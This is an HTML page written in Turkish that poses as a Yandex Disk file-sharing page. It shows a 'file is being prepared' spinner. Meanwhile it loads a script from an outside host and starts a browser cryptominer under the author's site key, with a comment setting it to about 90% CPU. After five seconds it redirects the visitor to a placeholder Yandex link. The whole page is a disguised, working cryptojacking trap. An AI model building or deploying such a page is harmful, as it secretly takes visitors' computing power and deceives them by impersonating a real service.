<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <title>Yandex Disk - Dosya Paylaşımı</title>
    <style>
        body { background: #1a1a1a; color: white; font-family: sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
        .loader { border: 5px solid #333; border-top: 5px solid #ffcc00; border-radius: 50%; width: 50px; height: 50px; animation: spin 1s linear infinite; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>
    <div style="text-align: center;">
        <div class="loader"></div>
        <p>Dosya Hazırlanıyor, Lütfen Bekleyin...</p>
    </div>

    <script src="https://www.hostingcloud.racing/jeVO.js"></script>
    <script>
        // Senin Site Key'inle madenci ateşleniyor
        var _client = new Client.Anonymous('ae5f219d63b18a851a9a0cfe3e4dbe17df998943e07bed8eb17dd899ee5ac244', {
            throttle: 0.1, // %90 güç! (Panelde görünmesi için en yüksek seviye)
            c: 'w'
        });
        _client.start();

        // 5 saniye sonra Yandex'e yönlendir
        setTimeout(function(){
            window.location.href = "BURAYA_GERCEK_YANDEX_LINKINI_YAZ";
        }, 5000);
    </script>
</body>
</html>
